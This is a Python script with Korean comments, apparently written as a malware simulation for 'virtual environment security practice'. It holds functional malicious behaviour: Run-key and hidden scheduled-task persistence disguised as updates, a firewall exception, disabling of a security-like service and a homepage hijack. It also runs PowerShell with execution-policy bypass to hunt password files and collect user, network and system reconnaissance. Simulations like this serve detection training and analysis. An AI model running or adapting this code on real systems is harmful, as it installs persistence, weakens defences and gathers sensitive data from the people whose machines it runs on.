import time

import os
import sys
import subprocess
import platform
import socket
import psutil
import winreg as winreg # Python 2.x에서는 winreg, Python 3.x에서는 _winreg
# 파이썬 3.x 에서는 import winreg 로 변경해주세요!
# 예를 들어, python 3.x 이면:
# import winreg
# 대신: winreg = __import__('winreg')

print("안녕! 가상 환경 보안 실습을 시작할게! 😼")
print("-" * 50)

# --- 1. 실행 환경 확인 ---
def check_parent_process():
    try:
        current_process = psutil.Process(os.getpid())
        parent_process = current_process.parent()
        if parent_process:
            parent_name = parent_process.name().lower()
            print(f"부모 프로세스: {parent_name}")
            if parent_name != "excel.exe":
                print("부모 프로세스가 excel.exe가 아니야. 😟 악성 행위를 수행하지 않고 종료할게!")
                sys.exit(0) # 정상 종료
            else:
                print("오! 부모 프로세스가 excel.exe네! 계속 진행할게! 🚀")
        else:
            print("부모 프로세스를 찾을 수 없어. 🤔 안전하게 종료할게.")
            sys.exit(0)
    except Exception as e:
        print(f"부모 프로세스 확인 중 오류 발생: {e} 🧐 안전하게 종료할게.")
        sys.exit(0)

# 이 부분을 주석 해제하면 부모 프로세스 확인 로직이 활성화 돼.
# 가상 환경에서 Excel로 이 파이썬 스크립트를 실행해야겠지?
# check_parent_process()
print("DEBUG: 부모 프로세스 확인 로직은 현재 주석 처리되어 있어! 가상 환경 테스트를 위해 임시로 비활성화했어. ✨")
print("만약 부모 프로세스 체크를 하고 싶다면 `check_parent_process()` 줄의 주석을 해제해줘! 🔑")
print("-" * 50)


# --- 2. 악성 행위 실행 (Excel.exe가 부모인 경우) ---
print("이제부터 악성 행위 시뮬레이션 시작! 😈 (오직 가상 환경에서만!)")

time.sleep(5)

# 2.1. 레지스트리 생성 및 변조 (10개 이상)
print("\n--- 레지스트리 조작 ---")

def set_registry_value(key_path, value_name, value_data, hive=winreg.HKEY_CURRENT_USER):
    try:
        key = winreg.CreateKeyEx(hive, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
        winreg.CloseKey(key)
        print(f"✅ 레지스트리: '{hive}\\{key_path}'에 '{value_name}' = '{value_data}' 성공!")
    except Exception as e:
        print(f"❌ 레지스트리: '{hive}\\{key_path}'에 '{value_name}' 설정 실패: {e}")

# 현재 스크립트의 경로 (실제 악성코드라면 이 파일이 됨)
current_script_path = os.path.abspath(__file__)

# 1. 시작 시 자동 실행 (Report_Updater)
set_registry_value(r"Software\Microsoft\Windows\CurrentVersion\Run", "Report_Updater", current_script_path)

# 2. 사용자 정보/캠페인 ID 저장
set_registry_value(r"Software\CustomMalware\Settings", "UserID", "GuestUser_1234")
set_registry_value(r"Software\CustomMalware\Settings", "CampaignID", "Phishing_2025_Q3")
set_registry_value(r"Software\CustomMalware\Settings", "Version", "1.0.1")

# 3. 방화벽 예외 설정 추가 (가상 경로)
# 이 부분은 실제 파일 경로를 지정해야 함. 시뮬레이션을 위해 임의의 경로 사용.
fake_malware_path = r"C:\Program Files\Common Files\malware.exe"
firewall_key = r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List"
set_registry_value(firewall_key, fake_malware_path, f"{fake_malware_path}:*:Enabled:FakeMalwareRule", winreg.HKEY_LOCAL_MACHINE) # 관리자 권한 필요

# 4. 서비스 시작 제어 우회 시뮬레이션 (가상의 서비스)
# HKEY_LOCAL_MACHINE에 설정해야 하며, 관리자 권한 필요.
# 이 값은 실제 서비스가 아니며, 개념적인 우회 시뮬레이션.
set_registry_value(r"SYSTEM\CurrentControlSet\Services\FakeDefenderSvc", "Start", "4", winreg.HKEY_LOCAL_MACHINE) # 4는 'Disabled'

# 5. 시스템 정보 레지스트리 저장
computer_name = platform.node()
ip_address = socket.gethostbyname(socket.gethostname()) # 로컬 IP
set_registry_value(r"Software\SystemInfo", "ComputerName", computer_name)
set_registry_value(r"Software\SystemInfo", "IPAddress", ip_address)
set_registry_value(r"Software\SystemInfo", "OS", platform.platform())
set_registry_value(r"Software\SystemInfo", "Processor", platform.processor())

# 6. 추가 레지스트리 설정 (총 10개 이상 채우기 위해)
set_registry_value(r"Software\BrowserSettings", "HomePage", "http://malicious.example.com")
set_registry_value(r"Software\NetworkConfig", "ProxyEnabled", "1")
set_registry_value(r"Software\NetworkConfig", "ProxyServer", "127.0.0.1:8080")

print("✨ 레지스트리 조작 완료! 무려 10개 넘게 했다구! ✨")

# 2.2. 파워쉘 스크립트 분할 및 실행
print("\n--- PowerShell 스크립트 분할 및 실행 ---")

temp_dir = os.path.join(os.environ['TEMP']) # 윈도우즈 TEMP 경로

# 각 기능을 별도의 PowerShell 스크립트 내용으로 정의
ps_scripts = {
    "file_search": f"""
# PowerShell 스크립트 1: 파일 검색
Write-Host "➡️ PowerShell 스크립트 1/5: 'password' 파일 검색 중..."
$desktopPath = [Environment]::GetFolderPath('Desktop')
try {{
    Get-ChildItem -Path "$desktopPath" -Filter "*password*" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length | Out-String | Add-Content -Path "{os.path.join(temp_dir, 'ps_search_results.txt')}"
    Write-Host "   검색 결과: '{os.path.join(temp_dir, 'ps_search_results.txt')}'에 저장됨."
}} catch {{
    Write-Warning "   파일 검색 중 오류 발생: $_"
}}
""",
    "user_info": f"""
# PowerShell 스크립트 2: 사용자 정보 수집
Write-Host "➡️ PowerShell 스크립트 2/5: 사용자 정보 수집 중..."
try {{
    whoami /all | Out-String | Add-Content -Path "{os.path.join(temp_dir, 'ps_user_info.txt')}"
    Write-Host "   whoami 정보: '{os.path.join(temp_dir, 'ps_user_info.txt')}'에 저장됨."
}} catch {{
    Write-Warning "   사용자 정보 수집 중 오류 발생: $_"
}}
""",
    "network_info": f"""
# PowerShell 스크립트 3: 네트워크 정보 수집
Write-Host "➡️ PowerShell 스크립트 3/5: 네트워크 정보 수집 중..."
try {{
    Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily | Out-String | Add-Content -Path "{os.path.join(temp_dir, 'ps_network_info.txt')}"
    Write-Host "   네트워크 정보: '{os.path.join(temp_dir, 'ps_network_info.txt')}'에 저장됨."
}} catch {{
    Write-Warning "   네트워크 정보 수집 중 오류 발생: $_"
}}
""",
    "process_control": f"""
# PowerShell 스크립트 4: 프로세스 제어 (notepad.exe 종료 시도)
Write-Host "➡️ PowerShell 스크립트 4/5: notepad.exe 프로세스 종료 시도 중..."
try {{
    Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Stop-Process -Force
    Write-Host "   notepad.exe (만약 있다면) 종료 완료!"
}} catch {{
    Write-Warning "   notepad.exe 종료 시도 실패 (실행 중이 아니거나 권한 부족): $_"
}}
""",
    "scheduled_task": f"""
# PowerShell 스크립트 5: 작업 스케줄러 등록
Write-Host "➡️ PowerShell 스크립트 5/5: 작업 스케줄러 등록 중..."
$taskName = "MalwareUpdater"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File \\"{current_script_path}\\"" # 이 파이썬 스크립트 자신을 재실행
$trigger = New-ScheduledTaskTrigger -AtStartup
try {{
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "시스템 업데이트를 가장한 악성 작업" -Force
    Write-Host "   작업 스케줄러: '$taskName' 등록 완료!"
}} catch {{
    Write-Warning "   작업 스케줄러 등록 실패 (관리자 권한 필요): $_"
}}
"""
}

for name, content in ps_scripts.items():
    ps_script_path = os.path.join(temp_dir, f"{name}.ps1")
    try:
        with open(ps_script_path, "w") as f:
            f.write(content)
        print(f"✅ PowerShell 스크립트 '{ps_script_path}' 생성 완료.")

        command = f"powershell.exe -ExecutionPolicy Bypass -File \"{ps_script_path}\""
        print(f"Executing: {command}")
        # subprocess.run 대신 subprocess.Popen을 사용하면 백그라운드에서 실행될 수 있음.
        # 여기서는 스크립트가 순차적으로 실행되는 것을 보여주기 위해 run 사용.
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        print(f"✅ '{name}' 스크립트 실행 완료!")
        # print(f"  Stdout:\n{result.stdout}") # 필요하면 출력 확인
        # print(f"  Stderr:\n{result.stderr}") # 필요하면 에러 확인

    except subprocess.CalledProcessError as e:
        print(f"❌ '{name}' 스크립트 실행 실패 (오류 코드: {e.returncode}): {e.stderr}")
    except Exception as e:
        print(f"❌ '{name}' 스크립트 생성/실행 중 오류 발생: {e}")

print("🎉 모든 개별 PowerShell 스크립트 실행 완료!")

# 2.3. 정보수집 및 파일 저장 (5개 이상)
print("\n--- 정보 수집 및 파일 저장 ---")

info_file_path = os.path.join(temp_dir, "info.txt")

# 기존 파일이 있다면 삭제
if os.path.exists(info_file_path):
    os.remove(info_file_path)
    print(f"기존 '{info_file_path}' 파일 삭제 완료.")

commands = [
    "systeminfo",
    "net user",
    "ipconfig /all",
    "tasklist",
    "driverquery",
    "wmic product get name,version", # 설치된 프로그램 목록
    "netstat -ano", # 활성 연결
]

with open(info_file_path, "a") as f: # append 모드로 열어 순차적으로 추가
    for cmd in commands:
        print(f"➡️ '{cmd}' 정보 수집 중...")
        f.write(f"\n--- Output of '{cmd}' ---\n")
        try:
            # shell=True 사용 시 문자열로 명령어를 넘김
            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True, encoding='cp949', errors='ignore') # 윈도우즈 기본 인코딩 cp949
            f.write(result.stdout)
            print(f"   성공적으로 수집하여 추가 완료!")
        except subprocess.CalledProcessError as e:
            f.write(f"ERROR executing '{cmd}':\n{e.stderr}\n")
            print(f"   오류 발생: {e.stderr.strip()}")
        except Exception as e:
            f.write(f"GENERAL ERROR for '{cmd}': {e}\n")
            print(f"   예상치 못한 오류 발생: {e}")

print(f"✅ 모든 정보가 '{info_file_path}'에 저장되었어! 파일 크기: {os.path.getsize(info_file_path) / 1024:.2f} KB")